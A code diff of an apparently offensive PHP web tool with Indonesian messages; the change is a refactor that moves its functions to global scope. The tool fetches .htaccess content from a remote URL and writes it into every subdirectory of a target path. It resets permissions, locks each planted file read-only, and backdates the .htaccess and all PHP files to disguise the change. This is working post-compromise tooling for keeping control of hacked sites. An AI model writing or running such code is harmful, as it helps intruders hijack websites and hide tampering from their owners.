@@ -6,6 +6,10 @@ error_reporting(E_ALL);
 $success = [];
 $error = [];
 
+// ===================================================================
+// LANGKAH 1: DEFINISIKAN SEMUA FUNGSI DI SINI (GLOBAL SCOPE)
+// ===================================================================
+
 function fetchFileFromUrl($url) {
     $ch = curl_init($url);
     curl_setopt_array($ch, [
@@ -19,11 +23,117 @@ function fetchFileFromUrl($url) {
     return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
 }
 
+function setFolders0755($dir, &$success, &$error) {
+    if (!is_readable($dir)) { return; }
+    $items = @scandir($dir);
+    if ($items === false) { return; }
+
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $path = $dir . '/' . $item;
+        if (is_dir($path)) {
+            if (@chmod($path, 0755)) {
+                $success[] = "✅ Folder chmod 0755: $path";
+            } else {
+                $error[] = "❌ Gagal chmod folder: $path (mungkin permission denied)";
+            }
+            setFolders0755($path, $success, $error);
+        }
+    }
+}
+
+function setFiles0644($dir, &$success, &$error) {
+    if (!is_readable($dir)) { return; }
+    $items = @scandir($dir);
+    if ($items === false) { return; }
+
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $path = $dir . '/' . $item;
+        if (is_dir($path)) {
+            setFiles0644($path, $success, $error);
+        } elseif (is_file($path)) {
+            if (@chmod($path, 0644)) {
+                $success[] = "✅ File chmod 0644: $path";
+            } else {
+                $error[] = "❌ Gagal chmod file: $path";
+            }
+        }
+    }
+}
+
+function unlockHtaccessFiles($dir, &$success, &$error) {
+    if (!is_readable($dir)) { return; }
+    $items = @scandir($dir);
+    if ($items === false) { return; }
+    
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $path = $dir . '/' . $item;
+        if (is_dir($path)) {
+            unlockHtaccessFiles($path, $success, $error);
+        } elseif ($item === '.htaccess') {
+            if (@chmod($path, 0644)) {
+                $success[] = "✅ Unlock .htaccess: $path";
+            } else {
+                $error[] = "❌ Gagal unlock .htaccess: $path (mungkin file tidak dimiliki user ini)";
+            }
+        }
+    }
+}
+
+function deployHtaccess($dir, $content, &$success, &$error, $timestamp = false) {
+    if (!is_readable($dir)) { return; }
+    $items = @scandir($dir);
+    if ($items === false) { return; }
+
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $path = $dir . '/' . $item;
+
+        if (is_dir($path)) {
+            $htaccessPath = $path . '/.htaccess';
+
+            if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
+                @chmod($htaccessPath, 0644);
+            }
+            
+            if (@file_put_contents($htaccessPath, $content) === false) {
+                $error[] = "❌ Gagal deploy ke: $htaccessPath (tidak bisa menulis file)";
+            } else {
+                $success[] = "✅ Deployed .htaccess: $htaccessPath";
+                if (@chmod($htaccessPath, 0444)) {
+                    $success[] = "🔒 .htaccess dikunci (0444): $htaccessPath";
+                } else {
+                    $error[] = "❌ Gagal chmod .htaccess 0444: $htaccessPath";
+                }
+
+                if ($timestamp && @touch($htaccessPath, $timestamp)) {
+                    $success[] = "⏱️ Timestamp set untuk $htaccessPath";
+                } elseif ($timestamp) {
+                    $error[] = "❌ Gagal set timestamp: $htaccessPath";
+                }
+            }
+            deployHtaccess($path, $content, $success, $error, $timestamp);
+            
+        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php' && $timestamp) {
+            if (@touch($path, $timestamp)) {
+                $success[] = "⏱️ Timestamp set untuk PHP: $path";
+            } else {
+                $error[] = "❌ Gagal set timestamp untuk PHP: $path";
+            }
+        }
+    }
+}
+
+// ===================================================================
+// LANGKAH 2: PROSES LOGIKA HANYA SAAT REQUEST METHOD ADALAH POST
+// ===================================================================
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $targetPath = rtrim($_POST['target_path'], '/');
     $url = $_POST['htaccess_url'];
-$timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;
-
+    $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;
 
     if (!is_dir($targetPath)) {
         $error[] = "❌ Target path not found: $targetPath";
@@ -32,114 +142,7 @@ $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : fals
         if (!$htaccessContent) {
             $error[] = "❌ Gagal ambil isi .htaccess dari URL.";
         } else {
-            function setFolders0755($dir, &$success, &$error) {
-                if (!is_readable($dir)) { return; } // Tambahan: Skip jika tidak bisa dibaca
-                $items = @scandir($dir);
-                if ($items === false) { return; } // Tambahan: Skip jika scandir gagal
-
-                foreach ($items as $item) {
-                    if ($item === '.' || $item === '..') continue;
-                    $path = $dir . '/' . $item;
-                    if (is_dir($path)) {
-                        if (@chmod($path, 0755)) {
-                            $success[] = "✅ Folder chmod 0755: $path";
-                        } else {
-                            $error[] = "❌ Gagal chmod folder: $path (mungkin permission denied)";
-                        }
-                        setFolders0755($path, $success, $error);
-                    }
-                }
-            }
-
-            function setFiles0644($dir, &$success, &$error) {
-                if (!is_readable($dir)) { return; } // Tambahan
-                $items = @scandir($dir);
-                if ($items === false) { return; } // Tambahan
-
-                foreach ($items as $item) {
-                    if ($item === '.' || $item === '..') continue;
-                    $path = $dir . '/' . $item;
-                    if (is_dir($path)) {
-                        setFiles0644($path, $success, $error);
-                    } elseif (is_file($path)) {
-                        if (@chmod($path, 0644)) {
-                            $success[] = "✅ File chmod 0644: $path";
-                        } else {
-                            $error[] = "❌ Gagal chmod file: $path";
-                        }
-                    }
-                }
-            }
-
-            function unlockHtaccessFiles($dir, &$success, &$error) {
-                if (!is_readable($dir)) { return; } // Tambahan
-                $items = @scandir($dir);
-                if ($items === false) { return; } // Tambahan
-                
-                foreach ($items as $item) {
-                    if ($item === '.' || $item === '..') continue;
-                    $path = $dir . '/' . $item;
-                    if (is_dir($path)) {
-                        unlockHtaccessFiles($path, $success, $error);
-                    } elseif ($item === '.htaccess') {
-                        if (@chmod($path, 0644)) {
-                            $success[] = "✅ Unlock .htaccess: $path";
-                        } else {
-                            $error[] = "❌ Gagal unlock .htaccess: $path (mungkin file tidak dimiliki user ini)";
-                        }
-                    }
-                }
-            }
-
-            function deployHtaccess($dir, $content, &$success, &$error, $timestamp = false) {
-                if (!is_readable($dir)) { return; } // Tambahan
-                $items = @scandir($dir);
-                if ($items === false) { return; } // Tambahan
-
-                foreach ($items as $item) {
-                    if ($item === '.' || $item === '..') continue;
-                    $path = $dir . '/' . $item;
-
-                    if (is_dir($path)) {
-                        $htaccessPath = $path . '/.htaccess';
-
-                        if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
-                            // Coba unlock dulu sebelum menulis
-                            @chmod($htaccessPath, 0644);
-                        }
-                        
-                        if (@file_put_contents($htaccessPath, $content) === false) {
-                            $error[] = "❌ Gagal deploy ke: $htaccessPath (tidak bisa menulis file)";
-                        } else {
-                            $success[] = "✅ Deployed .htaccess: $htaccessPath";
-                            if (@chmod($htaccessPath, 0444)) {
-                                $success[] = "🔒 .htaccess dikunci (0444): $htaccessPath";
-                            } else {
-                                $error[] = "❌ Gagal chmod .htaccess 0444: $htaccessPath";
-                            }
-
-                            if ($timestamp && @touch($htaccessPath, $timestamp)) {
-                                $success[] = "⏱️ Timestamp set untuk $htaccessPath";
-                            } elseif ($timestamp) {
-                                $error[] = "❌ Gagal set timestamp: $htaccessPath";
-                            }
-                        }
-                        // Lanjutkan ke subfolder
-                        deployHtaccess($path, $content, $success, $error, $timestamp);
-                        
-                    } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php' && $timestamp) {
-                        if (@touch($path, $timestamp)) {
-                            $success[] = "⏱️ Timestamp set untuk PHP: $path";
-                        } else {
-                            $error[] = "❌ Gagal set timestamp untuk PHP: $path";
-                        }
-                    }
-                }
-            }
-    }
-}
-
-
+            // PANGGIL SEMUA FUNGSI DI DALAM BLOK INI
             $success[] = "--- 🔧 LANGKAH AWAL: Set Permission Folder & File ---";
             setFolders0755($targetPath, $success, $error);
             setFiles0644($targetPath, $success, $error);
@@ -147,7 +150,6 @@ $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : fals
             unlockHtaccessFiles($targetPath, $success, $error);
             $success[] = "--- 🚀 MASS DEPLOY .htaccess ---";
             deployHtaccess($targetPath, $htaccessContent, $success, $error, $timestamp);
-
         }
     }
 }
@@ -175,8 +177,8 @@ $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : fals
         <label>🌐 URL .htaccess (GitHub raw, dll):</label>
         <input type="text" name="htaccess_url" placeholder="https://raw.githubusercontent.com/.../.htaccess" required>
 
-<label>⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
-<input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">
+        <label>⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
+        <input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">
 
         <button type="submit">🚀 Deploy Sekarang</button>
     </form>
